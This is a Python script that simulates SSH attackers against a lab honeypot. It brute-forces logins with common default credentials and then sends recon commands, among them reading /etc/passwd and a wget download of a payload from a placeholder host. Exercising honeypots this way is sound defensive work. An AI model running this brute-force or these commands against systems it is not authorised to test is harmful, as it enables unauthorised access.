"""Simulate SSH attacker behaviour against YOUR OWN lab honeypot (lab use only).

    python scenarios/ssh_scenario.py bruteforce [host] [port]
    python scenarios/ssh_scenario.py session    [host] [port]
"""
import asyncio
import sys

import asyncssh

MODE = sys.argv[1] if len(sys.argv) > 1 else "bruteforce"
HOST = sys.argv[2] if len(sys.argv) > 2 else "127.0.0.1"
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 2222

CREDENTIALS = [("root", "123456"), ("root", "password"), ("admin", "admin"), ("ubuntu", "ubuntu"),
               ("test", "test"), ("root", "toor"), ("pi", "raspberry"), ("user", "qwerty")]
RECON = ["whoami", "id", "uname -a", "cat /etc/passwd", "ls -la /home", "ps",
         "wget http://example.com/payload.sh", "history", "exit"]


async def bruteforce() -> None:
    """One connection per credential pair, like hydra does."""
    for user, pwd in CREDENTIALS:
        try:
            async with asyncssh.connect(HOST, PORT, username=user, password=pwd,
                                        known_hosts=None, preferred_auth="password"):
                print(f"{user}:{pwd} -> accepted")
        except asyncssh.PermissionDenied:
            print(f"{user}:{pwd} -> denied")
        except (OSError, asyncssh.Error) as e:
            print(f"{user}:{pwd} -> error: {e}")


async def session() -> None:
    """Retry until the honeypot lets us in, then run recon commands."""
    conn = None
    for _ in range(5):
        try:
            conn = await asyncssh.connect(HOST, PORT, username="root", password="toor",
                                          known_hosts=None, preferred_auth="password")
            break
        except asyncssh.PermissionDenied:
            print("login refused, retrying")
    if conn is None:
        return
    async with conn:
        proc = await conn.create_process(term_type="xterm")
        for cmd in RECON:
            proc.stdin.write(cmd + "\n")
            await asyncio.sleep(0.3)
        print(await asyncio.wait_for(proc.stdout.read(), 10))


if __name__ == "__main__":
    asyncio.run(bruteforce() if MODE == "bruteforce" else session())
